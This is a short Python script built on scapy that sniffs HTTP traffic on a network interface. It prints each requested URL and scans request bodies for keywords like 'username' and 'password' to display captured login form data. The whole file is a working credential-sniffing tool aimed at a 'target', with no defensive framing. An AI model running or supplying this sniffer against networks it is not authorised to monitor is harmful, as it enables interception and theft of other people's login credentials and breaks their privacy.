#!/usr/bin/env python

import colorama
from colorama import Fore
import scapy.all as scapy
from scapy.layers import http

#creating a function to sniff the packets from the target
def sniff(interface):
    #Sniffing the packets using scapy module
    #iface=> specfiy the target
    #store=>
    #prn=> to trigger another function to process the sniffed data
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

#creating a function to process the sniffed data
def process_sniffed_packet(packet):

    #Checking if the packet contain any http request 
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP REQUEST >> {url}")
        #Checking if the packet has any scapy.Raw
        if packet.haslayer(scapy.Raw):
            #Storing the http request in the load variable
            load = packet[scapy.Raw].load
            keyword = ["username", "password", "pass", "user", "login"]
            #For loop for checking the http load contain the keyword keys in it
            for keywords in keyword:
                #Checking for the keyword in the http request
                if keywords in load.decode("latin-1"):
                    print(f"\n\n{Fore.GREEN}[+] Login Form >> {load}\n\n")
                    break

#calling the function
sniff("eth0") 